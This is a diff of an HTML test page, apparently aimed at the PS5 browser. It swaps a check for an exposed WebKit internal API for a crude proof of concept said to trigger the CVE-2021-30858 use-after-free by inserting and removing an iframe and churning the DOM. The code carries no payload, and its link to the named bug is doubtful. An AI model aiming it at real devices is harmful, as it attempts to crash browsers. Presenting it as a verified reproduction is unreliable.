@@ -1,29 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS5 WebKit PoC - SetMockWebAuthenticationConfiguration</title>
-</head>
-<body>
-  <h1>PS5 PoC - API Check</h1>
-  <pre id="result">Checking...</pre>
-
+  <meta charset="utf-8">
+  <title>PoC - CVE-2021-30858</title>
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
   <script>
-    function checkVulnerability() {
-      let result = document.getElementById('result');
-      try {
-        // Intento de acceso a la API posiblemente restringida
-        if (typeof internals !== "undefined" &&
-            typeof internals.setMockWebAuthenticationConfiguration === "function") {
-          result.textContent = "✅ Vulnerable: SetMockWebAuthenticationConfiguration está disponible.";
-        } else {
-          result.textContent = "❌ No vulnerable: API no disponible o ha sido restringida.";
+    function triggerUAF() {
+      console.log("[*] Ejecutando PoC CVE-2021-30858...");
+
+      let iframe = document.createElement("iframe");
+      iframe.src = "http://example.com"; // carga insegura que será "upgradeada"
+      document.body.appendChild(iframe);
+
+      // Simula condiciones de race / liberación anticipada
+      setTimeout(() => {
+        document.body.removeChild(iframe);
+        console.log("[*] iframe eliminado");
+
+        // Forzar GC
+        for (let i = 0; i < 10000; i++) {
+          let tmp = document.createElement("div");
+          tmp.innerHTML = i;
         }
-      } catch (e) {
-        result.textContent = "❌ Error al intentar acceder a la API: " + e;
-      }
+
+        console.log("[*] Finalizado, si WebKit es vulnerable, puede haber crash o freeze.");
+      }, 10);
     }
 
-    checkVulnerability();
+    window.onload = triggerUAF;
   </script>
+</head>
+<body>
+  <h1>Test CVE-2021-30858</h1>
+  <p>Este test provocará un posible crash si el navegador es vulnerable al bug CSP Use-After-Free.</p>
 </body>
 </html>
